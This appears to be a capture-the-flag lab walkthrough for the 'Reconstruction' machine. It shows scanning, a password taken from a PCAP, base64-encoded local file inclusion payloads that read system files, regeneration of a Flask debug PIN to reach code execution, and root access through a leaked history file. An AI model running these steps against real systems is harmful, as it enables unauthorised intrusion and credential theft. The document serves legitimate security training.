# Exploitation Guide for Reconstruction

## Summary

We will leverage a local file inclusion vulnerability in a Flask  application to enable debug mode. We’ll then escalate via a rather  humorous disclosure of root user credentials in a history file.

## Enumeration

### Nmap

To begin, a simple `nmap` scan reveals that ports 21, 22, and 8080 are open.

```
kali@kali:~$ sudo nmap 192.168.120.121
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 11:06 EDT
Nmap scan report for 192.168.120.121
Host is up (0.040s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Scanning port 21 with the `-sC` flag indicates that anonymous login is allowed.

```
kali@kali:~$ sudo nmap -p 21 192.168.120.121 -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 12:03 EDT
Nmap scan report for 192.168.120.121
Host is up (0.029s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Apr 29 18:16 WebSOC
|_-rw-r--r--    1 0        0             137 Apr 29 18:17 note.txt
...
```

In addition, the FTP server contains two files: **note.txt** and **WebSOC**.

### Wfuzz

The website running on port 8080 doesn’t reveal anything interesting, but `wfuzz` reveals two hidden directories: **/login** and **/data**.

```
kali@kali:~$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.120.121:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.120.121:8080/FUZZ/
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                              
===================================================================

000000216:   302        3 L      24 W     257 Ch      "create"                                             
000000236:   302        3 L      24 W     253 Ch      "data"                                               
000000487:   200        75 L     138 W    2297 Ch     "login"                                              
000000490:   200        66 L     126 W    2011 Ch     "logout"                                             
...
```

Navigating to [**/login**](http://192.168.120.121:8080/login/), we are prompted for a password. We’ll come back to this.

### Gobuster

Next, we’ll scan the website with `Gobuster` (and the **/usr/share/wordlists/dirb/common.txt** wordlist) which reveals the **/console** directory.

```
kali@kali:~$ gobuster dir -u http://192.168.120.121:8080 -w /usr/share/wordlists/dirb/common.txt -z
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
...
===============================================================
2020/10/06 09:08:16 Starting gobuster
===============================================================
/console (Status: 200)
...
```

Navigating to [the **/console** endpoint](http://192.168.120.121:8080/console), we discover that the debugging console functionality which, based on  the location, appears to be a Flask application. However, this requires a PIN to unlock, and we can neither guess nor crack the PIN at this  point.

## Exploitation

### PCAP File Inspection

Moving along, we’ll log in and retrieve the discovered files from the FTP server.

```
kali@kali:~$ ftp 192.168.120.121
Connected to 192.168.120.121.
220 (vsFTPd 3.0.3)
Name (192.168.120.121:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 29 18:16 WebSOC
-rw-r--r--    1 0        0             137 Apr 29 18:17 note.txt
226 Directory send OK.
ftp> 
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (137 bytes).
226 Transfer complete.
137 bytes received in 0.01 secs (21.2634 kB/s)
ftp> 
ftp> cd WebSOC
250 Directory successfully changed.
ftp> 
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0         3086771 Apr 29 17:14 1.05.2020.pcap
-rw-r--r--    1 0        0          869677 Apr 29 16:32 29.04.2020.pcap
-rw-r--r--    1 0        0        14579662 Apr 29 16:36 30.04.2020.pcap
226 Directory send OK.
ftp> 
ftp> get 1.05.2020.pcap
local: 1.05.2020.pcap remote: 1.05.2020.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 1.05.2020.pcap (3086771 bytes).
226 Transfer complete.
3086771 bytes received in 0.61 secs (4.8217 MB/s)
ftp> 
ftp> get 29.04.2020.pcap
local: 29.04.2020.pcap remote: 29.04.2020.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 29.04.2020.pcap (869677 bytes).
226 Transfer complete.
869677 bytes received in 0.34 secs (2.4436 MB/s)
ftp> 
ftp> get 30.04.2020.pcap
local: 30.04.2020.pcap remote: 30.04.2020.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 30.04.2020.pcap (14579662 bytes).
226 Transfer complete.
14579662 bytes received in 2.22 secs (6.2512 MB/s)
ftp> bye
221 Goodbye.

kali@kali:~$
```

The contents of **note.txt** include the following:

```
kali@kali:~$ cat note.txt 
I've just setup the new WebSOC! This should hopefully help us catch these filthy hackers!


TODO: remove leftover passwords from testing
kali@kali:~$
```

We will keep the `TODO` comment in mind as we move ahead.

The **WebSOC** folder contains three PCAP files that we can open and inspect with `Wireshark`. Most of the information is useless, but packet number `13745` in **1.05.2020.pcap** reveals the admin password for the web application (`1edfa9b54a7c0ec28fbc25babb50892e`):

![Admin password in wireshark](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_36_image_1_aoQizXBV.jpg)

We can now [log in](http://192.168.120.121:8080/login) with the recovered password.

### LFI

Now that we are authenticated to the application, we’ll turn our attention back to the **/data** endpoint revealed by the `wfuzz` scan. To probe it, we will set up our browser to use `Burp` proxy and navigate to [**/data**](http://192.168.120.121:8080/data/) which presents a simple `Hello World!`. The server responses don’t contain anything interesting.

However, browsing to [`/data/FUZZ`](http://192.168.120.121:8080/data/FUZZ) presents a `Something went wrong!` error, and the server responds with the following:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 21
X-Error: [Errno 2] No such file or directory: '\x15FY'
Vary: Cookie
Set-Cookie: session=.eJwli1EKgCAQBa-yvG_pAN0kQkRsK8HWcJU-xLsX9DUwzHS4PXk9WTGvHVQ_QFsIrAqDJTfyhUnyQykfB28UZYId1sDdXC4vLN9TS2ODv3BRfjFex6kgSA.X3xxxQ.tC04bOvFnBdF0GOiPLx45LBTeeM; Expires=Fri, 06-Nov-2020 13:31:49 GMT; HttpOnly; Path=/
...
```

The `X-Error: [Errno 2] No such file or directory: '\x15FY'` line is important to note here.

Testing this further, we can request [`/data/a`](http://192.168.120.121:8080/data/a) which returns the following response:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 13
X-Error: Incorrect padding
...
```

This is usually an error associated with base64 decoding. If we encode `a` in base64, it becomes `YQ==`. Let’s try http://192.168.120.121:8080/data/YQ==, which returns the following error:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 21
X-Error: [Errno 2] No such file or directory: 'a'
...
```

This type of error suggests we may be able to leverage a local file  inclusion vulnerability in the application. Let’s test this with **/etc/passwd** (base-64-encoded as `L2V0Yy9wYXNzd2Q=`) which becomes http://192.168.120.121:8080/data/L2V0Yy9wYXNzd2Q=:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
jack:x:1001:1001::/home/jack:/bin/bash 
```

The inclusion is successful, and we see the contents of the file.

For now, we’ll take a note of the `jack` user.

Now that we have confirmed an LFI vulnerability, we need to find a  way to leverage it for further exploitation. After some investigation,  we discover that we are unable to include files with `py`, `txt`, `pyc`, `ini`, or `conf` extensions.

Recalling that this is a Flask application with an enabled (but  locked) debugging console, let’s research a potential bypass. Reading [this blog post](https://www.kingkk.com/2018/08/Flask-debug-pin安全问题/), we discover that we can recreate the Flask debug pin by exploiting the LFI vulnerability.

We should be able to do this with [this script](https://gist.github.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42), but first we need the contents of three files: **/etc/machine-id** (`L2V0Yy9tYWNoaW5lLWlk`), **/proc/self/cgroup** (`L3Byb2Mvc2VsZi9jZ3JvdXA=`), and **/sys/class/net/INTERFACE_NAME/address**. We discover the machine id in **/etc/machine-id** by browsing to http://192.168.120.121:8080/data/L2V0Yy9tYWNoaW5lLWlk:

```
00566233196142e9961b4ea12a2bdb29
```

The **/proc/self/cgroup** file (http://192.168.120.121:8080/data/L3Byb2Mvc2VsZi9jZ3JvdXA=) contains the following:

```
12:perf_event:/ 11:freezer:/ 10:hugetlb:/ 9:rdma:/ 8:pids:/system.slice/blog.service 7:memory:/system.slice/blog.service 6:cpuset:/ 5:net_cls,net_prio:/ 4:devices:/system.slice/blog.service 3:blkio:/system.slice/blog.service 2:cpu,cpuacct:/system.slice/blog.service 1:name=systemd:/system.slice/blog.service 0::/system.slice/blog.service 
```

The value to note here is `blog.service`.

Finally, we need the MAC address of the network interface.  Unfortunately, we do not know the name of the interface the target is  using, but we can attempt a few more frequently-used names. Eventually,  we detect `ens160`, resolving the file of interest to be **/sys/class/net/ens160/address** (`L3N5cy9jbGFzcy9uZXQvZW5zMTYwL2FkZHJlc3M=`).

Navigating to [that address](http://192.168.120.121:8080/data/L3N5cy9jbGFzcy9uZXQvZW5zMTYwL2FkZHJlc3M=), we find the MAC address to be `00:50:56:8a:fc:e8` or `345049332968` in decimal.

### Remote Code Execution

Now that we have all the information needed to recreate the Flask  debug PIN, we can attempt to gain remote code execution. We can recreate the PIN with a script:

```
kali@kali:~$ python3 get_flask_pin.py --machineid '00566233196142e9961b4ea12a2bdb29blog.service' --uuid 345049332968
[!] App.py base path not provided, trying for most versions of python
2.7: 808-636-148
3.0: 326-388-942
3.1: 497-064-428
3.2: 134-262-617
3.3: 190-791-220
3.4: 238-677-304
3.5: 210-728-119
3.6: 173-509-958
3.7: 159-262-052
3.8: 751-326-702
kali@kali:~$ 
```

Although we do not know the exact version of python the target is  running, we can try all of these PINs. Eventually, we succeed with  version 3.6.

However, depending on certain events occurring during the boot cycle of this particular machine, **/proc/self/cgroup** is sometimes not included in the computation of the debug PIN. In fact, this anomaly occurred during this particular boot. Because of this, we  are unsuccessful with a PIN value of `173-509-958`.

In this case, we’ll re-run the Python script removing `blog.service` (which was appended to the machine ID):

```
kali@kali:~$ python3 get_flask_pin.py --machineid '00566233196142e9961b4ea12a2bdb29' --uuid 345049332968
[!] App.py base path not provided, trying for most versions of python
2.7: 120-566-406
3.0: 438-454-566
3.1: 207-828-493
3.2: 414-794-431
3.3: 359-376-798
3.4: 150-123-880
3.5: 207-574-021
3.6: 299-818-227
3.7: 327-733-603
3.8: 224-299-250
kali@kali:~$ 
```

In this case, PIN `299-818-227` was correct and allows us to proceed. After unlocking the debugging console, we obtain RCE:

```
>>> import os
>>> os.popen("id").read()
'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
>>> 
```

## Escalation

### Flask Application Enumeration

Although we could obtain a reverse shell at this point, we can  escalate in another way. Knowing this is a Flask application, let’s  review the main **app.py** file:

```
>>> print(os.popen("cat app.py").read())
#!/usr/bin/python3
import datetime
import functools
import os
import re
import urllib
from base64 import b64decode
import getpass

import flask
from flask import (Flask, flash, Markup, redirect, render_template, request,
                   Response, session, url_for)
from markdown import markdown
from markdown.extensions.codehilite import CodeHiliteExtension
from markdown.extensions.extra import ExtraExtension
from micawber import bootstrap_basic, parse_html
from micawber.cache import Cache as OEmbedCache
from peewee import *
from playhouse.flask_utils import FlaskDB, get_object_or_404, object_list
from playhouse.sqlite_ext import *


#ADMIN_PASSWORD = 'ee05d64d2528102d45e2db60986727ed'
ADMIN_PASSWORD = '1edfa9b54a7c0ec28fbc25babb50892e'
APP_DIR = os.path.dirname(os.path.realpath(__file__))
DATABASE = 'sqliteext:///%s' % os.path.join(APP_DIR, 'blog.db')
DEBUG = False
SECRET_KEY = '2d82e3a08a632feb12a4d2e1159a224750480122a1fb9845e67a7305cfff4ec8'
...
>>>
```

The app contains a commented-out admin user password (`#ADMIN_PASSWORD = 'ee05d64d2528102d45e2db60986727ed'`). Recall the contents of the **note.txt** file we recovered from the FTP server:

```
...
TODO: remove leftover passwords from testing
```

Let’s take advantage of this forgotten to-do item.

### SSH

Since there are two user accounts on this system (`jack` and `root`), let’s venture an educated guess that this Flask password may be shared  with a system user account. Although the password doesn’t work for root, we are able to login as `jack` with a password of `ee05d64d2528102d45e2db60986727ed`.

```
kali@kali:~$ ssh jack@192.168.120.121
...
jack@reconstruction:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
jack@reconstruction:~$
```

As we enumerate the home directory, we discover **/home/jack/.local/share/powershell/PSReadLine/ConsoleHost_history.txt** which is a PowerShell history file. Let’s check out the contents of this file.

```
jack@reconstruction:~$ cat .local/share/powershell/PSReadLine/ConsoleHost_history.txt
Write-Host -ForegroundColor Green -BackgroundColor White Holy **** this works!
Write-Host -ForegroundColor Red -BackgroundColor Black Holy **** this works as well!
su FlauntHiddenMotion845
clear history
clearr
cls
exit
jack@reconstruction:~$
```

This history indicates a relatively common mistake. The `jack` user accidentally entered the root password on the command line with `su`. Realizing the mistake, `jack` ran `clear history` to attempt to clear the history, but the proper command to clear the PowerShell history is `Clear-History` so the attempt failed. Then, `jack` ran `clearr` to clear the screen, which also failed since the proper command is `clear`. Finally, `jack` ran `cls` which is a PowerShell alias that clears the screen, but leaves the history untouched. After all this flailing about, `jack` left the cleartext password in the history file.

Let’s use this password to attempt to log in as root:

```
jack@reconstruction:~$ su
Password: 
root@reconstruction:/home/jack# whoami
root
root@reconstruction:/home/jack#
```